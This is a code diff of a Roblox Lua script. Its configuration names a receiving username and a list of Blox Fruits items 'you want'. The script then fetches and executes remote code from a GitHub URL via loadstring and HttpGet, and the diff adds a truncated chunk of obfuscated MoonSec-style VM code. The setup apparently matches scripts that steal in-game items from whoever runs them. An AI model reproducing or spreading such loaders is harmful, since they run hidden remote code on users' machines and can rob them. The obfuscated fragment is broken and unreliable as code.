@@ -3,40 +3,5 @@ Usernames = {"thenicebroim"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
-          [3] = 4,
-        },
-        [35] = {
-          [1] = 26,
-          [2] = 2,
-          [3] = 0,
-          [4] = 0,
-        },
-        [36] = {
-          [1] = 119,
-          [2] = 2,
-          [3] = 2,
-          [4] = 0,
-        },
-        [37] = {
-          [1] = 118,
-          [2] = 0,
-          [3] = 1,
-          [4] = 0,
-        },
-      },
-      [2] = {
-      },
-      [3] = 2,
-      [4] = {
-      },
-    },
-  },
-  [3] = 0,
-  [4] = {
-  },
-}
-[table]:{
-}
-[table]:{
-  "MoonSec_StringsHiddenAttr" = true,
-}
+
+l=e[3];else n[d+3]=t;end elseif d==172 then if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;else n[e[2]]=#n[e[3]];end;elseif d<=174 then local h;local s,U;local d;n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];d=e[2]s,U=i(n[d](T(n,d+1,e[3])))f=U+d-1 h=0;for e=d,f do h=h+1;n[e]=s[h];end;l=l+1;e=o[l];d=e[2]n[d]=n[d](T(n,d+1,f))l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]]+e[4];l=l+1;e=o[l];t[e[3]]=n[e[2]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]]+n[e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]]-e[4];l=l+1;e=o[l];d=e[2]s,U=i(n[d](T(n,d+1,e[3])))f=U+d-1 h=0;for e=d,f do h=h+1;n[e]=s[h];end;l=l+1;e=o[l];d=e[2]n[d]=n[d](T(n,d+1,f))l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]]+n[e[4]];l=l+1;e=o[l];t[e[3]]=n[e[2]];l=l+1;e=o[l];do return n[e[2]]end l=l+1;e=o[l];do return end;elseif d>175 then if(n[e[2]]<n[e[4]])then l=l+1;else l=e[3];end;else if(e[2]<n[e[4]])then l=e[3];else l=l+1;end;end;l=l+1;end;end;end;return a(C(),{},r)(...);end)(...)
